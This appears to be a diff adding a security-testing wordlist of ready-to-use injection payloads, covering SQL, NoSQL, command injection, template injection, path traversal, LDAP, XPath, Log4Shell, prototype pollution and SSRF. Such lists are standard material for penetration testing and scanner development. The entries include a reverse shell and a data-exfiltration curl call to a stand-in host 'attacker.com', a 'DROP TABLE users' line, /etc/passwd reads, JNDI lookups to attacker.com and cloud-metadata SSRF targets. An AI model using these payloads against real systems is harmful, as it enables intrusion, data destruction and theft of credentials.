@@ -1,0 +1,96 @@
+# SQL Injection
+' OR 1=1 --
+' OR '1'='1
+' OR 1=1; --
+' UNION SELECT NULL,NULL --
+' UNION SELECT 1,table_name FROM information_schema.tables --
+'; DROP TABLE users; --
+') OR 1=1 --
+' WAITFOR DELAY '0:0:5' --
+1; SELECT SLEEP(5) --
+1' ORDER BY 1--
+
+# NoSQL Injection (MongoDB)
+{"$gt": ""}
+{"$ne": ""}
+{"$where": "1"}
+{"$exists": true}
+{"$regex": ".*"}
+username[$gt]=&password[$gt]=
+username[$ne]=&password[$ne]=
+
+# Command Injection
+; ls -la
+| id
+&& whoami
+|| echo pwned
+`cat /etc/passwd`
+$(cat /etc/passwd)
+; nc -e /bin/sh attacker.com 4444
+| curl attacker.com/$(whoami)
+& ping -c 10 127.0.0.1 &
+
+# SSTI (Server-Side Template Injection)
+{{7*7}}
+{{config}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+${7*7}
+${7*7:utf-8}
+#{7*7}
+<%= 7*7 %>
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+
+# Path Traversal
+../../../etc/passwd
+..\..\..\windows\win.ini
+....//....//....//etc/passwd
+..%252f..%252f..%252fetc%252fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+..;/..;/..;/etc/passwd
+/var/www/images/../../../etc/passwd
+file:///etc/passwd
+
+# LDAP Injection
+*
+*)(uid=*))
+*)(|(uid=*
+admin*
+*)(uid=*))(|(uid=*
+
+# XPath Injection
+' or '1'='1
+' or ''='
+x' or '1'='1
+x' or ''='
+
+# Log4Shell (JNDI)
+${jndi:ldap://attacker.com/a}
+${jndi:rmi://attacker.com/a}
+${${lower:jndi}:${lower:ldap}://attacker.com/a}
+${env:BAR}
+
+# Prototype Pollution (JS)
+{"__proto__": {"isAdmin": true}}
+{"constructor": {"prototype": {"isAdmin": true}}}
+{"__proto__": {"polluted": true}}
+x[__proto__][isAdmin]=true
+
+# SSRF Payloads
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+http://metadata.google.internal/computeMetadata/v1/
+http://100.100.100.200/latest/meta-data/
+http://localhost:6379
+http://localhost:9200
+http://localhost:27017
+http://localhost:3000
+http://127.0.0.1:5432
+http://0.0.0.0:22
+http://[::1]:80
+http://2130706433/
+http://0x7f000001/
+http://127.1/
+file:///etc/passwd
+dict://localhost:6379/info
+gopher://localhost:6379/_*2%0d%0a...
+http://evil.com@127.0.0.1/
